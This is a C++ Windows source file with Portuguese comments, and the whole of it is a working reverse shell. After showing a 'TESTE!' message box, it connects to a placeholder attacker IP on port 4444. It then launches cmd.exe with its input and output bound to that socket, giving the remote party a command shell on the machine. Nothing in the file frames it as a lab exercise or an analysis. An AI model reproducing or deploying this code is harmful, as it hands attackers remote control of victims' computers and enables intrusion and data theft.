#include <winsock2.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <memory>
#include <windows.h>

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFOW sui;
PROCESS_INFORMATION pi;

int main() {
    // Exibe uma caixa de mensagem com um alerta (usando strings wide)
    MessageBoxW(NULL, L"TESTE!", L"Alerta", MB_OK | MB_ICONWARNING);

    // IP do listener e porta na máquina do atacante
    std::string ip = "IP-atacante";
    int port = 4444; // altere para porta que você abriu 

    // Inicializa a biblioteca de sockets
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup falhou." << std::endl;
        return 1;
    }

    // Cria um socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if (wSock == INVALID_SOCKET) {
        std::cerr << "WSASocket falhou." << std::endl;
        WSACleanup();
        return 1;
    }

    // Configura a estrutura sockaddr_in
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip.c_str());

    // Conecta ao host remoto
    if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        std::cerr << "WSAConnect falhou." << std::endl;
        closesocket(wSock);
        WSACleanup();
        return 1;
    }

    // Converte a string ANSI para uma string wide
    wchar_t cmd[] = L"cmd.exe";

    // Inicializa a estrutura STARTUPINFO
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

    // Cria um novo processo (cmd.exe) com strings wide
    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)) {
        std::cerr << "CreateProcess falhou." << std::endl;
        closesocket(wSock);
        WSACleanup();
        return 1;
    }

    // Aguarda o processo terminar
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fecha os handles do processo e da thread
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(wSock);
    WSACleanup();

    return 0;
}
